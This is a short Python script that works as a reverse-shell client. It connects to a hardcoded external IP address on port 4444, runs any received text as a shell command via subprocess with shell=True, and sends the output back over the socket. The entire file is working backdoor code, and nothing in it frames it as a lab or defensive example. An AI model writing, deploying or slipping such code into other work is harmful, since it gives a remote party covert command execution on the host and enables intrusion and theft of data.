import threading, socket, os
import subprocess


class Client(object):
    def __init__(self, host, port):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.connect((host, port))
    

        threading.Thread(target = self.GetMessage).start()
    
    def GetMessage(self, buffer = 4096):
        while True:
            data = self.server.recv(buffer).decode()

            if data.startswith("cd "):
                os.chdir(data[3:-1])

            if len(data) > 0:
                process = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                op = process.stdout
                self.server.sendall(op.read())


if __name__ == "__main__":
    Client("64.52.85.94", 4444)